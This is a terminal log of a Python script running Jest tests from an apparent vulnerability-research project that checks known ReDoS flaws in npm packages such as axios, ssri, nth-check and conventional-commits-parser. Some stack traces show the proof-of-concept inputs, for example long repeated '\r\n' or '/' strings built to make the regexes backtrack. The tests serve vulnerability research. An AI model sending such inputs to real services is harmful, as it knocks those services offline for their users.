masudulhasanmasudbhuiyan@Masuduls-MacBook-Pro redos % python3 test_modules_in_serial.py
redos/revalidator_0.3.1/revalidator.test.js
PASS revalidator_0.3.1/revalidator.test.js
  ✓ ReDos in revalidator (2725 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.647 s
Ran all test suites matching /redos\/revalidator_0.3.1\/revalidator.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'validate', 'mixin' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'validate' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/github-url-to-object_4.0.2/github-url-to-object.test.js
PASS github-url-to-object_4.0.2/github-url-to-object.test.js
  ✓ ReDos in github-url-to-object (1448 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.34 s
Ran all test suites matching /redos\/github-url-to-object_4.0.2\/github-url-to-object.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/ssri_8.0.0/ssri.test.js
FAIL ssri_8.0.0/ssri.test.js
  ✕ ReDos in ssri (75 ms)

  ● ReDos in ssri

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/ssri/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in ssri

    TypeError: ssri.parse is not a function

       7 |     "\x1F";
       8 |   let t = measureTime(function () {
    >  9 |     const parsed = ssri.parse(integrity, {
         |                         ^
      10 |       strict: true,
      11 |       single: true,
      12 |     });

      at f (ssri_8.0.0/ssri.test.js:9:25)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (ssri_8.0.0/ssri.test.js:8:11)

  ● ReDos in ssri

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.99 s
Ran all test suites matching /redos\/ssri_8.0.0\/ssri.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/ssri_8.0.0/ssri.test.js']' returned non-zero exit status 1.
redos/string_3.3.3/string.test.js
PASS string_3.3.3/string.test.js
  ✓ ReDos in string (2999 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.89 s
Ran all test suites matching /redos\/string_3.3.3\/string.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'extendPrototype',\n      'restorePrototype',\n      'VERSION',\n      'TMPL_OPEN',\n      'TMPL_CLOSE',\n      'ENTITIES',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/remove-markdown_0.3.0/remove-markdown.test.js
PASS remove-markdown_0.3.0/remove-markdown.test.js (14.955 s)
  ✓ ReDos in remove-markdown (14421 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        15.324 s
Ran all test suites matching /redos\/remove-markdown_0.3.0\/remove-markdown.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/nth-check_2.0.0/nth-check.test.js
PASS nth-check_2.0.0/nth-check.test.js
  ✓ ReDos in nth-check (2227 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.12 s
Ran all test suites matching /redos\/nth-check_2.0.0\/nth-check.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'parse', 'compile', 'default' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/trim_0.0.1/trim.test.js
PASS trim_0.0.1/trim.test.js
  ✓ ReDos in trim (2056 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.946 s
Ran all test suites matching /redos\/trim_0.0.1\/trim.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'left', 'right', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/axios_0.21.0/axios.test.js
PASS axios_0.21.0/axios.test.js
  ✓ ReDoS in axios (2778 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.657 s
Ran all test suites matching /redos\/axios_0.21.0\/axios.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'request',      'getUri',\n      'delete',       'get',\n      'head',         'options',\n      'post',         'put',\n      'patch',        'defaults',\n      'interceptors', 'Axios',\n      'create',       'Cancel',\n      'CancelToken',  'isCancel',\n      'all',          'spread',\n      'default'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(0) {}\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: -1, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/fresh_0.5.0/fresh.test.js
PASS fresh_0.5.0/fresh.test.js
  ✓ ReDos in fresh (3233 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.989 s, estimated 4 s
Ran all test suites matching /redos\/fresh_0.5.0\/fresh.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, -1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/jspdf_2.1.1/jspdf.test.js


#
# Fatal error in , line 0
# Fatal JavaScript invalid size error 169220804
#
#
#
#FailureMessage Object: 0x7ff7b3c827e0
 1: 0x10c3b1492 node::NodePlatform::GetStackTracePrinter()::$_3::__invoke() [/Users/masudulhasanmasudbhuiyan/.nvm/versions/node/v16.13.1/bin/node]
 2: 0x10d37bb03 V8_Fatal(char const*, ...) [/Users/masudulhasanmasudbhuiyan/.nvm/versions/node/v16.13.1/bin/node]
 3: 0x10c634406 v8::internal::FactoryBase<v8::internal::Factory>::NewFixedArray(int, v8::internal::AllocationType) [/Users/masudulhasanmasudbhuiyan/.nvm/versions/node/v16.13.1/bin/node]
 4: 0x10c7c7fd4 v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedObjectElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)2> >::GrowCapacity(v8::internal::Handle<v8::internal::JSObject>, unsigned int) [/Users/masudulhasanmasudbhuiyan/.nvm/versions/node/v16.13.1/bin/node]
 5: 0x10c9e39ed v8::internal::Runtime_GrowArrayElements(int, unsigned long*, v8::internal::Isolate*) [/Users/masudulhasanmasudbhuiyan/.nvm/versions/node/v16.13.1/bin/node]
 6: 0x10cd9b2b9 Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit [/Users/masudulhasanmasudbhuiyan/.nvm/versions/node/v16.13.1/bin/node]
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/jspdf_2.1.1/jspdf.test.js']' died with <Signals.SIGTRAP: 5>.
redos/no-case_2.3.1/no-case.test.js
PASS no-case_2.3.1/no-case.test.js
  ✓ ReDos in no-case (3788 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        5.518 s
Ran all test suites matching /redos\/no-case_2.3.1\/no-case.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/platform_1.3.4/platform.test.js
PASS platform_1.3.4/platform.test.js
  ✓ ReDos in platform (1778 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.664 s
Ran all test suites matching /redos\/platform_1.3.4\/platform.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'description',  'layout',\n      'manufacturer', 'name',\n      'prerelease',   'product',\n      'ua',           'version',\n      'os',           'parse',\n      'toString'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 8\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/path-parse_1.0.6/path-parse.test.js
PASS path-parse_1.0.6/path-parse.test.js
  ✓ ReDos in path-parse (2157 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.076 s
Ran all test suites matching /redos\/path-parse_1.0.6\/path-parse.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'posix', 'win32', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/ramda_0.27.1/ramda.test.js
PASS ramda_0.27.1/ramda.test.js
  ✓ ReDos in ramda (3678 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.583 s
Ran all test suites matching /redos\/ramda_0.27.1\/ramda.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'F',                 'T',               '__',\n      'add',               'addIndex',        'adjust',\n      'all',               'allPass',         'always',\n      'and',               'any',             'anyPass',\n      'ap',                'aperture',        'append',\n      'apply',             'applySpec',       'applyTo',\n      'ascend',            'assoc',           'assocPath',\n      'binary',            'bind',            'both',\n      'call',              'chain',           'clamp',\n      'clone',             'comparator',      'complement',\n      'compose',           'composeK',        'composeP',\n      'composeWith',       'concat',          'cond',\n      'construct',         'constructN',      'contains',\n      'converge',          'countBy',         'curry',\n      'curryN',            'dec',             'defaultTo',\n      'descend',           'difference',      'differenceWith',\n      'dissoc',            'dissocPath',      'divide',\n      'drop',              'dropLast',        'dropLastWhile',\n      'dropRepeats',       'dropRepeatsWith', 'dropWhile',\n      'either',            'empty',           'endsWith',\n      'eqBy',              'eqProps',         'equals',\n      'evolve',            'filter',          'find',\n      'findIndex',         'findLast',        'findLastIndex',\n      'flatten',           'flip',            'forEach',\n      'forEachObjIndexed', 'fromPairs',       'groupBy',\n      'groupWith',         'gt',              'gte',\n      'has',               'hasIn',           'hasPath',\n      'head',              'identical',       'identity',\n      'ifElse',            'inc',             'includes',\n      'indexBy',           'indexOf',         'init',\n      'innerJoin',         'insert',          'insertAll',\n      'intersection',      'intersperse',     'into',\n      'invert',            'invertObj',       'invoker',\n      'is',\n      ... 157 more items\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'trim' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/millisecond_0.1.1/millisecond.test.js
PASS millisecond_0.1.1/millisecond.test.js
  ✓ ReDos in millisecond (2308 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.215 s
Ran all test suites matching /redos\/millisecond_0.1.1\/millisecond.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/papaparse_5.1.1/papaparse.test.js
PASS papaparse_5.1.1/papaparse.test.js (5.774 s)
  ✓ ReDos in ssri (5252 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        6.138 s
Ran all test suites matching /redos\/papaparse_5.1.1\/papaparse.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'parse',\n      'unparse',\n      'RECORD_SEP',\n      'UNIT_SEP',\n      'BYTE_ORDER_MARK',\n      'BAD_DELIMITERS',\n      'WORKERS_SUPPORTED',\n      'NODE_STREAM_INPUT',\n      'LocalChunkSize',\n      'RemoteChunkSize',\n      'DefaultDelimiter',\n      'Parser',\n      'ParserHandle',\n      'NetworkStreamer',\n      'FileStreamer',\n      'StringStreamer',\n      'ReadableStreamStreamer',\n      'DuplexStreamStreamer'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/rgb2hex_0.1.0/rgb2hex.test.js
PASS rgb2hex_0.1.0/rgb2hex.test.js (5.182 s)
  ✓ ReDos in rgb2hex (4646 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        5.541 s
Ran all test suites matching /redos\/rgb2hex_0.1.0\/rgb2hex.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/conventional-commits-parser_3.2.0/conventional-commits-parser.test.js
FAIL conventional-commits-parser_3.2.0/conventional-commits-parser.test.js
  ✕ ReDos in conventional-commits-parser (175 ms)

  ● ReDos in conventional-commits-parser

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/conventional-commits-parser/lib/parser.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in conventional-commits-parser

    TypeError: conventionalCommitsParser is not a function

      4 |   let payload = "b" + "\r\n".repeat(2000000) + "b";
      5 |   let t = measureTime(function () {
    > 6 |     conventionalCommitsParser(payload);
        |     ^
      7 |   });
      8 |   let time = t[0] + t[1] / 1000000000;
      9 |   expect(time).toBeGreaterThan(1);

      at f (conventional-commits-parser_3.2.0/conventional-commits-parser.test.js:6:5)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (conventional-commits-parser_3.2.0/conventional-commits-parser.test.js:5:11)

  ● ReDos in conventional-commits-parser

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.936 s, estimated 1 s
Ran all test suites matching /redos\/conventional-commits-parser_3.2.0\/conventional-commits-parser.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/conventional-commits-parser_3.2.0/conventional-commits-parser.test.js']' returned non-zero exit status 1.
redos/content_3.0.5/content.test.js
FAIL content_3.0.5/content.test.js
  ✕ ReDoS in content (169 ms)

  ● ReDoS in content

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/hoek/lib/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDoS in content

    TypeError: content.disposition is not a function

      3 |   const content = require("content");
      4 |   let t = measureTime(function () {
    > 5 |     content.disposition("form-data;x" + " ".repeat(2000));
        |             ^
      6 |   });
      7 |   let time = t[0] + t[1] / 1000000000;
      8 |   expect(time).toBeGreaterThan(1);

      at f (content_3.0.5/content.test.js:5:13)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (content_3.0.5/content.test.js:4:11)

  ● ReDoS in content

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.063 s
Ran all test suites matching /redos\/content_3.0.5\/content.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/content_3.0.5/content.test.js']' returned non-zero exit status 1.
redos/content-type-parser_1.0.1/content-type-parser.test.js
FAIL content-type-parser_1.0.1/content-type-parser.test.js
  ✕ ReDoS in content-type-parser (42 ms)

  ● ReDoS in content-type-parser

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/content-type-parser/lib/content-type-parser.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDoS in content-type-parser

    TypeError: contentTypeParser is not a function

      3 |   const contentTypeParser = require("content-type-parser");
      4 |   let t = measureTime(function () {
    > 5 |     contentTypeParser("/".repeat(30000) + "\r\n");
        |     ^
      6 |   });
      7 |   let time = t[0] + t[1] / 1000000000;
      8 |   expect(time).toBeGreaterThan(1);

      at f (content-type-parser_1.0.1/content-type-parser.test.js:5:5)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (content-type-parser_1.0.1/content-type-parser.test.js:4:11)

  ● ReDoS in content-type-parser

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.022 s
Ran all test suites matching /redos\/content-type-parser_1.0.1\/content-type-parser.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/content-type-parser_1.0.1/content-type-parser.test.js']' returned non-zero exit status 1.
redos/natural_5.1.0/natural.test.js
FAIL natural_5.1.0/natural.test.js
  ✕ ReDos in natural (3635 ms)

  ● ReDos in natural

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/natural/lib/natural/stemmers/Carry/index.js: path.node.body.body.unshift is not a function

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in natural

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        4.537 s
Ran all test suites matching /redos\/natural_5.1.0\/natural.test.js/i.
